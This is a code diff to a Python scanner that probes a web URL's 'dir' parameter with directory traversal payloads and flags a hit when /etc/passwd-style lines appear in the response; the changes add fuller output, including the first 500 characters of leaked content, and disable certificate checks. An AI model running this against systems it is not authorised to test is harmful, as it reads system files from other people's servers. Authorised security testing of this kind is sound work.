@@ -18,16 +18,29 @@ def check_directory_traversal(url):
         "Daemon:2:2:Daemon:/sbin:/sbin/nologin"
     ]
     
+    vulnerability_found = False
+
     for payload in payloads:
         test_url = f"{url}?dir={payload}"
         try:
             response = requests.get(test_url, verify=False)  # verify=False to ignore SSL certificate warnings
             response_text = response.text
+            is_vulnerable = False
             if response.status_code == 200:
                 for expected_string in expected_strings:
                     if expected_string in response_text:
-                        print(f"Vulnerable to Directory Traversal: {test_url}")
+                        is_vulnerable = True
                         break
+                if is_vulnerable:
+                    vulnerability_found = True
+                    print(f"Vulnerable to Directory Traversal: {test_url}")
+                    print(f"Response Length: {len(response_text)}")
+                    print(f"Response Content (First 500 chars): {response_text[:500]}")
+                    break  # Stop checking other payloads once a vulnerability is found
+                else:
+                    print(f"Not Vulnerable (Expected content not found): {test_url}")
+                    print(f"Response Length: {len(response_text)}")
+                    print(f"Response Content (First 500 chars): {response_text[:500]}")
             elif response.status_code == 403:
                 print(f"Forbidden: {test_url}")
             elif response.status_code == 401:
@@ -38,6 +51,9 @@ def check_directory_traversal(url):
                 print(f"Unexpected Status ({response.status_code}): {test_url}")
         except Exception as e:
             print(f"Error checking {test_url}: {str(e)}")
+    
+    if not vulnerability_found:
+        print("No vulnerability found")
 
 if __name__ == "__main__":
     import sys
